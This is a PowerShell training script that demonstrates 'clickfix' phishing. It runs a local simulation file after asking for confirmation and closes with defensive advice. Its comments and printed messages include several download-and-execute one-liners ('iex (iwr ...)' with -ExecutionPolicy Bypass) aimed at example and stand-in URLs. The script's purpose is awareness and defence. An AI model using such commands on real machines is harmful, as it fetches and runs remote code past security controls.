# ================================================
# LAUNCHER SCRIPT - Demonstrates Invoke-Expression
# ================================================
#
# This script demonstrates how malicious actors often use 
# Invoke-Expression to fetch and execute remote PowerShell scripts
# in phishing attacks (especially "clickfix" type attacks)
#
# Usage examples that attackers might instruct victims to run:
# 
# Via Run Dialog (Win+R):
# powershell -ep bypass -c "iex (iwr 'https://raw.githubusercontent.com/user/repo/main/simalicious.ps1').Content"
#
# Via Command Prompt:
# powershell.exe -ExecutionPolicy Bypass -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://example.com/script.ps1' -UseBasicParsing).Content"
#

Write-Host "CYBERSECURITY TRAINING - Launcher Script Demo" -ForegroundColor Green
Write-Host "=" * 50 -ForegroundColor Green

Write-Host "`nThis script demonstrates common PowerShell attack patterns:" -ForegroundColor Yellow

Write-Host "`n1. INVOKE-EXPRESSION (IEX) PATTERN:" -ForegroundColor Cyan
Write-Host "   Attackers often use one-liners like this in phishing emails:" -ForegroundColor White
Write-Host '   powershell -ep bypass -c "iex (iwr ''https://malicious.com/script.ps1'').Content"' -ForegroundColor Red

Write-Host "`n2. EXECUTION POLICY BYPASS:" -ForegroundColor Cyan  
Write-Host "   Notice how they bypass PowerShell security with -ExecutionPolicy Bypass" -ForegroundColor White

Write-Host "`n3. CLICKFIX SOCIAL ENGINEERING:" -ForegroundColor Cyan
Write-Host "   Victims are told to press Win+R and paste the malicious command" -ForegroundColor White
Write-Host "   Often disguised as 'fixes' for fake error messages" -ForegroundColor White

Write-Host "`n4. REMOTE SCRIPT EXECUTION:" -ForegroundColor Cyan
Write-Host "   The actual malicious payload is hosted remotely and downloaded" -ForegroundColor White
Write-Host "   This makes it harder to detect and analyze" -ForegroundColor White

Write-Host "`nDEMONSTRATION:" -ForegroundColor Green
Write-Host "Instead of fetching from a remote URL, we'll execute the local simulation..." -ForegroundColor Yellow

# For safety, we'll execute the local script instead of downloading from web
$scriptPath = Join-Path $PSScriptRoot "simalicious.ps1"

if (Test-Path $scriptPath) {
    Write-Host "`nExecuting local simulation script..." -ForegroundColor Green
    Write-Host "Command being simulated: Invoke-Expression (Get-Content '$scriptPath' -Raw)" -ForegroundColor Gray
    
    # Ask for confirmation in training environment
    $response = Read-Host "`nProceed with malware simulation? (y/N)"
    if ($response -eq 'y' -or $response -eq 'Y') {
        Write-Host "`nStarting simulation in 3 seconds..." -ForegroundColor Yellow
        Start-Sleep -Seconds 3
        
        # Execute the simulation script
        Invoke-Expression (Get-Content $scriptPath -Raw)
    } else {
        Write-Host "Simulation cancelled. Script would have executed: $scriptPath" -ForegroundColor Green
    }
} else {
    Write-Host "Error: Simulation script not found at $scriptPath" -ForegroundColor Red
    Write-Host "Make sure simalicious.ps1 is in the same directory as this launcher" -ForegroundColor Yellow
}

Write-Host "`n" + "=" * 50 -ForegroundColor Green
Write-Host "TRAINING COMPLETE" -ForegroundColor Green
Write-Host "Key Takeaways:" -ForegroundColor Yellow
Write-Host "• Never run PowerShell commands from untrusted sources" -ForegroundColor White
Write-Host "• Be suspicious of 'clickfix' instructions in emails" -ForegroundColor White  
Write-Host "• Invoke-Expression can execute dangerous remote code" -ForegroundColor White
Write-Host "• Always verify scripts before execution" -ForegroundColor White
Write-Host "• Use proper endpoint protection and monitoring" -ForegroundColor White